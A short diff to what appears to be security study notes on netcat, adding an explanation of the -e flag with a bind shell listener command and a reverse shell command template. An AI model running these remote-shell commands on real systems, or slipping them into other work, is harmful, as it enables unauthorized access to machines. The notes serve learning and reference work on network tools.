@@ -593,6 +593,9 @@ Flags:
 - `-l`: Listen (instead of reach out for a connection)
 - `-v`: Verbosity
 - `-p`: Specify port when listening (ex: `nc -p 80`)
+- `-e`: Executes a command after successful connection
+  - Bind shell listeners commonly set up with `nc -lvp 1337 -e /bin/bash`
+  - Reverse shell connections can be made with `nc -e /bin/bash [target] [ip]
   
 Piping netcat output to a file:  
 ``` console
